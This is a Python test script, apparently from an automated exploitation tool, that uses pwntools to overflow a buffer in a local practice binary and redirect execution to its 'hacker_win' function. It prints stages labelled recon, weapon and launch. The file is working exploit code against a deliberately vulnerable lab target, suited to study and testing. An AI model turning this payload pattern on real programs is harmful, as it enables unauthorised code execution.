from pwn import *
from aegis.core.exploitation.payload_factory import PayloadFactory
import os

def test_exploit():
    print("=== SPRINT 9: AUTOMATED EXPLOITATION TEST ===")
    
    binary_path = "./targets/overflow_app"
    if not os.path.exists(binary_path):
        print("Error: Binary missing.")
        return

    # 1. Analyze the Binary (Find the address of hacker_win)
    # ELF is a pwntools class that parses the binary structure
    elf = ELF(binary_path, checksec=False)
    win_func_address = elf.symbols['hacker_win']
    print(f"[RECON] Found target function 'hacker_win' at: {hex(win_func_address)}")

    # 2. Determine the Offset (The Distance to the Return Pointer)
    # For this specific C code with GCC, the buffer (64) + Base Pointer (8) = 72 bytes.
    # In a real scenario, we would use 'cyclic' patterns to find this automatically.
    offset = 72
    
    # 3. Initialize Factory
    factory = PayloadFactory()
    
    # 4. Generate the Weapon
    payload = factory.generate_buffer_overflow(offset, win_func_address)
    print(f"[WEAPON] Payload Size: {len(payload)} bytes")
    # Only print first 20 chars of hex to keep output clean
    print(f"[WEAPON] Hex (Snippet): {payload.hex()[:40]}...")

    # 5. Launch the Attack (Local Process)
    print("\n[LAUNCH] Starting process and sending payload...")
    io = process(binary_path)
    
    # FIX: Do not wait for prompt (Buffering causes deadlock). Attack immediately.
    io.sendline(payload)
    
    # 6. Check for Success
    # We read all output. If we see the "PWNED" message, we win.
    try:
        output = io.recvall(timeout=1).decode(errors='ignore')
        if "PWNED" in output:
            print("\n[SUCCESS] TARGET COMPROMISED!")
            print("    The binary execution flow was redirected to hacker_win().")
        else:
            print(f"\n[FAILURE] Target crashed but did not jump correctly.\nOutput: {output}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    test_exploit()